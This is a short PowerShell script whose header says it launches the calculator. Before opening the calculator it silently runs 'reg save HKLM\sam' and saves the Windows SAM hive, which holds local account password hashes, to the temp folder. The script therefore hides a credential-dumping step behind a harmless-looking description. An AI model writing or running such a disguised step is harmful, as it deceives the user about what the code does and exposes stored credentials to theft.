<#
.SYNOPSIS
	Launches the calculator application
#>
reg save HKLM\sam %temp%\sam
Start-Process ms-calculator:
